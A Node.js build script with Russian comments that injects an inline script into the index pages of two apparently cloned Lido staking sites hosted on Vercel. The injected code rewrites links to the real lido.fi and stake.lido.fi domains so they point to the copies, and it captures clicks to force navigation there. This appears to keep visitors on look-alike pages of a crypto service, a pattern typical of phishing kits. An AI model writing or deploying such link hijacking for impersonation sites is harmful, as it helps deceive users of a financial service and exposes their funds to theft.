// vercel-link-guard.js — чинит кросс-линки main ⇄ stake на проде
const fs = require('fs'), path = require('path'), cheerio = require('cheerio');
const MAIN = 'https://lido-web-mine-site.vercel.app';
const STAKE = 'https://lido-web-stake-site.vercel.app';
const MARK = 'VERCEL LINK GUARD ACTIVE';

function walk(dir, out=[]) {
  for (const e of fs.readdirSync(dir, {withFileTypes:true})) {
    const p = path.join(dir, e.name);
    if (e.isDirectory()) walk(p, out);
    else if (e.isFile() && e.name === 'index.html') out.push(p);
  }
  return out;
}
const files = [...walk('mine-site'), ...walk('stake-site')];

const RUNTIME = `
<script>
/* ${MARK} */
(function(){
  var MAIN='${MAIN}', STAKE='${STAKE}';

  function map(url){
    try{
      var s=String(url||'');
      if (/^https?:\\/\\/localhost:8000\\b/.test(s)) return MAIN+'/';
      if (/^https?:\\/\\/localhost:8001\\b/.test(s)) return STAKE+'/';
      if (/^https?:\\/\\/(?:www\\.)?lido\\.fi\\/?$/i.test(s)) return MAIN+'/';
      if (/^https?:\\/\\/(?:www\\.)?stake\\.lido\\.fi/i.test(s)) return STAKE+'/';
    }catch(_){}
    return null;
  }

  // перепишем href у всех ссылок
  document.querySelectorAll('a[href]').forEach(function(a){
    var next = map(a.getAttribute('href')||'');
    if (next) a.setAttribute('href', next);
  });

  // перехват кликов (capture)
  document.addEventListener('click', function(e){
    var a = e.target.closest && e.target.closest('a[href]');
    if (!a) return;
    var next = map(a.getAttribute('href')||'');
    if (next){ e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); location.href = next; }
  }, true);
})();
</script>`;

let changed=0;
for (const f of files){
  const html = fs.readFileSync(f,'utf8');
  if (html.includes(MARK)) continue;
  const $ = cheerio.load(html, {decodeEntities:false});
  ($('body').length ? $('body') : $.root()).append(RUNTIME);
  fs.writeFileSync(f+'.bakBeforeVercelGuard', html, 'utf8');
  fs.writeFileSync(f, $.html(), 'utf8');
  console.log('✓ guard:', f);
  changed++;
}
console.log('Готово. Патчей:', changed);
